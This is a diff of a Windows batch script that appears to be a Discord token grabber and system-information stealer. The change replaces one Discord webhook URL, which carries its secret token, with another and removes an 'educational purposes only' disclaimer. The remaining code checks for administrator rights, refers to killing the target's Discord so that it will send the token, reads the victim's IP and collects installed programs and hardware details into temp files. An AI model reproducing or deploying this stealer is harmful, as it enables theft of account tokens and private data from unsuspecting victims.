@@ -1,16 +1,8 @@
 
    
 @echo off
-:: i dont take any responsibility for damage done with the programm it's for educational purposes only
-::replace the YOURWEBHOOK field with your webhook
-set webhook=https://discord.com/api/webhooks/1315452884820824074/x13Nz3ZbgCEK9yy2neRR1unqPtSOhxNJb011VX2wgbz5zGg8WeYu-JfqyYjaYXmmXy1k
-
-
-
-
+set webhook=https://discord.com/api/webhooks/1315843658062495744/Dl_gdXB7m2qLfnnYasr2YtenjeayN3vB_Ii9UPp5nnIqJc2asLOiJ2W9RhzR2fDKlV1v
 :check_Permissions
-    
-
     net session >nul 2>&1
     if %errorLevel% == 0 (
         goto starti
@@ -20,8 +12,6 @@ set webhook=https://discord.com/api/webhooks/1315452884820824074/x13Nz3ZbgCEK9yy
        timeout 2 >NUL
        goto check_Permissions
     )
-
-
 :starti
 ::set 1 if you want that the discord of your target get closed ( discord needs to be restarted to send you the token)
 set /a killdc = 0
@@ -32,9 +22,6 @@ set /p ip=<%userprofile%\AppData\Local\Temp\ipp.txt
 
 ::gets a list of all installed programms
 powershell -Command "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table >%userprofile%\AppData\Local\Temp\programms.txt "
-
-
-::gets informations about the pc
 echo Hard Drive Space:>%userprofile%\AppData\Local\Temp\System_INFO.txt
 wmic diskdrive get size>>%userprofile%\AppData\Local\Temp\System_INFO.txt
 echo Service Tag:>>%userprofile%\AppData\Local\Temp\System_INFO.txt
